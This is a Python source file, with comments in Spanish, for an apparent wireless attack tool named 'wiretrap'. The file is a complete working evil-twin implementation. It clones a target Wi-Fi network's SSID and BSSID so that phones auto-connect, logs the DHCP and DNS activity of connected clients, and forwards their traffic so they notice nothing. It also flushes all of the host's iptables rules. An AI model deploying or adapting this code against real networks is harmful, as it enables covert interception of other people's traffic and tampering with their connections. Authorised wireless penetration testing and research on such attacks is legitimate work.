import subprocess
import threading
import os
import sys
import time

WIRETRAP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, WIRETRAP_DIR)


class EvilTwin:
    """
    Levanta un AP falso con el mismo SSID que el objetivo.
    Usa hostapd para el AP y dnsmasq para DHCP + DNS.
    Activa IP forwarding para que el cliente tenga internet
    y no detecte nada raro.
    """

    def __init__(self, interface):
        self.base_interface = interface
        self.ap_iface = interface
        self.running = False
        self._hostapd_proc = None
        self._dnsmasq_proc = None

        # Configuración de red del evil twin
        self.gateway_ip = "192.168.87.1"
        self.dhcp_start = "192.168.87.2"
        self.dhcp_end   = "192.168.87.20"
        self.subnet     = "255.255.255.0"

        # Rutas de archivos temporales
        self.hostapd_conf  = "/tmp/wiretrap_hostapd.conf"
        self.dnsmasq_conf  = "/tmp/wiretrap_dnsmasq.conf"

        # Callbacks para la GUI
        self.on_started     = None
        self.on_client_join = None
        self.on_stopped     = None
        self.on_error       = None

    @staticmethod
    def _hw_mode_for_channel(channel):
        """
        hw_mode=g (802.11g) solo vale para 2.4GHz (canales 1-14).
        Los canales 5GHz (36, 40, 44, 48, 52... 165) necesitan
        hw_mode=a; si no, hostapd rechaza el canal y muere al
        arrancar sin que se note (el proceso simplemente termina).
        """
        try:
            ch = int(channel)
        except (TypeError, ValueError):
            return "g"
        return "a" if ch >= 36 else "g"

    def _create_ap_interface(self):
        """Crea una interfaz virtual AP (wtrap_ap) sobre el mismo PHY."""
        import re
        res = subprocess.run(["iw", "dev", self.base_interface, "info"],
                             capture_output=True, text=True)
        phy = re.search(r'wiphy (\d+)', res.stdout)
        if phy:
            self.ap_iface = "wtrap_ap"
            subprocess.run(["iw", "dev", self.ap_iface, "del"], capture_output=True)
            subprocess.run(["iw", "phy", f"phy{phy.group(1)}", "interface",
                            "add", self.ap_iface, "type", "__ap"], capture_output=True)
        else:
            self.ap_iface = self.base_interface

    def _delete_ap_interface(self):
        if hasattr(self, 'ap_iface') and self.ap_iface == "wtrap_ap":
            subprocess.run(["iw", "dev", self.ap_iface, "del"], capture_output=True)

    def _spoof_bssid(self, bssid: str):
        """
        Clona la MAC del AP legítimo en la interfaz AP.
        Con mismo SSID + misma contraseña + mismo BSSID, iOS/Android
        no distinguen el Evil Twin del AP real y conectan al de mayor señal.
        """
        subprocess.run(
            ["ip", "link", "set", self.ap_iface, "down"],
            capture_output=True
        )
        subprocess.run(
            ["ip", "link", "set", self.ap_iface, "address", bssid],
            capture_output=True
        )
        subprocess.run(
            ["ip", "link", "set", self.ap_iface, "up"],
            capture_output=True
        )

    def _write_hostapd_conf(self, ssid, channel, security,
                            wpa_passphrase="wiretrap123", bssid=None):
        """Genera el archivo de configuración de hostapd"""
        hw_mode = self._hw_mode_for_channel(channel)
        extra = "ieee80211n=1\n"
        if hw_mode == "a":
            extra += "ieee80211ac=1\ncountry_code=ES\n"
        # Si se especifica BSSID (spoof), lo forzamos en hostapd también
        # para que los beacons salgan con esa dirección.
        bssid_line = f"bssid={bssid}\n" if bssid else ""

        if security == "WPA2":
            conf = f"""interface={self.ap_iface}
driver=nl80211
ssid={ssid}
hw_mode={hw_mode}
channel={channel}
{bssid_line}{extra}macaddr_acl=0
auth_algs=1
wpa=2
wpa_passphrase={wpa_passphrase}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
        else:
            conf = f"""interface={self.ap_iface}
driver=nl80211
ssid={ssid}
hw_mode={hw_mode}
channel={channel}
{bssid_line}{extra}macaddr_acl=0
auth_algs=1
"""
        with open(self.hostapd_conf, "w") as f:
            f.write(conf)

    def _write_dnsmasq_conf(self, upstream_dns="8.8.8.8"):
        """Genera el archivo de configuración de dnsmasq"""
        conf = f"""interface={self.ap_iface}
bind-interfaces
dhcp-range={self.dhcp_start},{self.dhcp_end},{self.subnet},12h
dhcp-option=3,{self.gateway_ip}
dhcp-option=6,{self.gateway_ip}
server={upstream_dns}
log-queries
log-dhcp
"""
        with open(self.dnsmasq_conf, "w") as f:
            f.write(conf)

    def _setup_interface(self, channel):
        """Configura la interfaz y la IP del gateway"""
        cmds = [
            f"ip link set {self.ap_iface} down",
            f"iw dev {self.ap_iface} set type __ap",
            f"ip link set {self.ap_iface} up",
            f"ip addr flush dev {self.ap_iface}",
            f"ip addr add {self.gateway_ip}/24 dev {self.ap_iface}",
        ]
        for cmd in cmds:
            subprocess.run(cmd.split(), capture_output=True)

    def _enable_forwarding(self, out_interface):
        """Activa IP forwarding y NAT para dar internet al cliente"""
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            capture_output=True
        )
        # Limpiar reglas previas
        subprocess.run(
            ["iptables", "-F"],
            capture_output=True
        )
        subprocess.run(
            ["iptables", "-t", "nat", "-F"],
            capture_output=True
        )
        # NAT: el tráfico del cliente sale por la interfaz real
        subprocess.run([
            "iptables", "-t", "nat", "-A", "POSTROUTING",
            "-o", out_interface, "-j", "MASQUERADE"
        ], capture_output=True)
        subprocess.run([
            "iptables", "-A", "FORWARD",
            "-i", self.ap_iface,
            "-o", out_interface, "-j", "ACCEPT"
        ], capture_output=True)
        subprocess.run([
            "iptables", "-A", "FORWARD",
            "-i", out_interface,
            "-o", self.ap_iface, "-j", "ACCEPT"
        ], capture_output=True)

    def _disable_forwarding(self):
        """Limpia las reglas de iptables al detener"""
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=0"],
            capture_output=True
        )
        subprocess.run(["iptables", "-F"], capture_output=True)
        subprocess.run(
            ["iptables", "-t", "nat", "-F"],
            capture_output=True
        )

    def _kill_conflicts(self):
        """Mata procesos que pueden interferir con hostapd/dnsmasq"""
        subprocess.run(
            ["pkill", "-f", "hostapd"],
            capture_output=True
        )
        subprocess.run(
            ["pkill", "-f", "dnsmasq"],
            capture_output=True
        )
        time.sleep(1)

    def start(self, ssid, channel=6,
              security="OPEN", out_interface="eth0",
              wpa_passphrase="wiretrap123", target_bssid=None):
        """
        Lanza el evil twin completo.

        Args:
            ssid:           Nombre de la red a clonar
            channel:        Canal del AP objetivo
            security:       OPEN o WPA2
            out_interface:  Interfaz con internet real (eth0, wlan0...)
            wpa_passphrase: Contraseña WPA2 real del AP para auto-conexión
            target_bssid:   BSSID del AP legítimo para spoofear la MAC.
                            Crítico en iOS/Android modernos: sin esto el
                            dispositivo ignora el Evil Twin aunque SSID y
                            contraseña sean correctos (BSSID stickiness).
        """
        if self.running:
            return

        try:
            self._kill_conflicts()
            self._create_ap_interface()
            self._write_hostapd_conf(ssid, channel, security,
                                     wpa_passphrase, target_bssid)
            self._write_dnsmasq_conf()
            # _setup_interface hace down/up e iw set type __ap, lo que
            # puede resetear la MAC en algunos drivers. El spoof de BSSID
            # debe ir DESPUÉS para que la MAC quede fijada antes de hostapd.
            self._setup_interface(channel)
            if target_bssid:
                self._spoof_bssid(target_bssid)
            self._enable_forwarding(out_interface)

            # Lanzar hostapd
            self._hostapd_proc = subprocess.Popen(
                ["hostapd", self.hostapd_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            time.sleep(1)

            # hostapd puede morir al instante si rechaza la config
            # (p.ej. canal/hw_mode incompatibles) sin que Popen lo
            # refleje hasta que consultamos poll(). Si ya terminó,
            # no seguimos: no tiene sentido levantar dnsmasq sobre
            # un AP que nunca llegó a emitir un beacon.
            if self._hostapd_proc.poll() is not None:
                stderr = self._hostapd_proc.stderr.read().decode(
                    "utf-8", errors="ignore"
                )
                self._hostapd_proc = None
                if self.on_error:
                    self.on_error(
                        f"hostapd no pudo arrancar: {stderr.strip()}"
                    )
                return

            # Lanzar dnsmasq
            self._dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", self.dnsmasq_conf,
                 "--no-daemon"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            self.running = True

            if self.on_started:
                self.on_started(ssid, channel)

            # Monitor en background
            threading.Thread(
                target=self._monitor,
                daemon=True
            ).start()

        except Exception as e:
            if self.on_error:
                self.on_error(str(e))

    def _monitor(self):
        """Monitoriza la salida de dnsmasq para detectar clientes"""
        if not self._dnsmasq_proc:
            return
        for line in self._dnsmasq_proc.stdout:
            if not self.running:
                break
            decoded = line.decode("utf-8", errors="ignore").strip()
            # Detectar cuando un cliente recibe IP por DHCP
            if "DHCPACK" in decoded or "DHCPOFFER" in decoded:
                if self.on_client_join:
                    self.on_client_join(decoded)

    def stop(self):
        """Detiene el evil twin y limpia todo"""
        self.running = False

        if self._hostapd_proc:
            self._hostapd_proc.terminate()
            self._hostapd_proc = None

        if self._dnsmasq_proc:
            self._dnsmasq_proc.terminate()
            self._dnsmasq_proc = None

        self._disable_forwarding()
        self._kill_conflicts()
        self._delete_ap_interface()

        # Limpiar archivos temporales
        for f in [self.hostapd_conf, self.dnsmasq_conf]:
            try:
                os.remove(f)
            except:
                pass

        if self.on_stopped:
            self.on_stopped()


# ── Test en terminal ──────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Uso: sudo python3 evil_twin.py "
              "<interfaz_ap> <ssid> <interfaz_salida>")
        print("Ejemplo: sudo python3 evil_twin.py "
              "wlan1 MiRedTest eth0")
        sys.exit(1)

    iface     = sys.argv[1]
    ssid      = sys.argv[2]
    out_iface = sys.argv[3]

    et = EvilTwin(iface)

    def on_started(ssid, ch):
        print(f"[+] Evil Twin activo: SSID={ssid} canal={ch}")

    def on_client(info):
        print(f"[+] Cliente conectado: {info}")

    def on_stopped():
        print("[!] Evil Twin detenido.")

    def on_error(e):
        print(f"[!] Error: {e}")

    et.on_started     = on_started
    et.on_client_join = on_client
    et.on_stopped     = on_stopped
    et.on_error       = on_error

    print(f"[*] Levantando Evil Twin:")
    print(f"    Interfaz AP  : {iface}")
    print(f"    SSID         : {ssid}")
    print(f"    Salida internet: {out_iface}")
    print(f"    Ctrl+C para detener\n")

    try:
        et.start(ssid=ssid, channel=6,
                 security="OPEN", out_interface=out_iface)
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        et.stop()
